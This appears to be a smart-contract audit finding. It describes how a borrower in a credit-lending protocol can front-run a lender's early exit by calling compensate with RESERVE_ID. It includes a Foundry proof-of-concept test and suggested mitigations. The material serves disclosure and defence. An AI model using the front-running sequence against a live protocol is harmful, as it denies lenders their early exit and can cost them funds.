# Vulnerability details

Lender can sell his credit to another lender via `buyCreditMarket` passing a credit position id, this is with the purpose to get his money early. To exit early another lender have to call the `buyCreditMarket` passing the credit position id of the lender that want exit early.

The problem is that the borrower of the lender that want to exit early can always front run the early exit calling the `compensate` function, this is because if the compensate function is been called with RESERVE_ID and passing the whole amount basically the function is changing a credit position Id of the lender for another one. so the call `buyCreditMarket` trying to buy the credit position Id is going to fail because the credit position id identifier now change.

Note that this vuln is in `SellCreditMarket` function too.


## Impact

Borrower can always  DoS a Lender trying to exit credit early.


## Proof of Concept

Run the next test in `BuyCreditMarket.t.sol`:

```solidity
function test_BuyCreditMarket_borrower_fron_run() public {
        //@note test
        _deposit(alice, weth, 100e18);
        _deposit(alice, usdc, 100e6);

        _deposit(bob, weth, 100e18);
        _deposit(bob, usdc, 100e6);

        _deposit(candy, weth, 100e18);
        _deposit(candy, usdc, 100e6);

        uint256 rate = 0.03e18;
        _sellCreditLimit(alice, int256(rate), 365 days);
        _sellCreditLimit(bob, int256(rate), 365 days);

        uint256 issuanceValue = 10e6;
        uint256 futureValue = Math.mulDivUp(issuanceValue, PERCENT + rate, PERCENT);
        uint256 tenor = 365 days;

        uint256 debtPositionId = _buyCreditMarket(bob, alice, futureValue, tenor);
        uint256 creditPositionId = size.getCreditPositionIdsByDebtPositionId(debtPositionId)[0];

        _compensate(alice, creditPositionId, type(uint256).max); //alice which is the borrowe front run compensate transaction

        vm.startPrank(candy);

        vm.expectRevert();
        size.buyCreditMarket(
            BuyCreditMarketParams({
                borrower: alice,
                creditPositionId: (type(uint256).max / 2),
                tenor: 150 days,
                amount: futureValue,
                deadline: block.timestamp,
                minAPR: 0,
                exactAmountIn: false
            })
        );
    }

```

What i am showing in the test is that a borrower can always compensate the credit position passing RESERVER_ID in the compensate function, changing the credit position id which is the identifier of the position successfully front running any attempt of exit early by the lender.

## Tools Used
Manual, foundry

## Recommended Mitigation Steps
Consider charge for the fragmentation fee even if the compensate is passing with RESERVER_ID, this can unencouraged a borrower for doing this.

Other solution is eliminate the possibility to compensate a entire position passing RESERVER_ID.
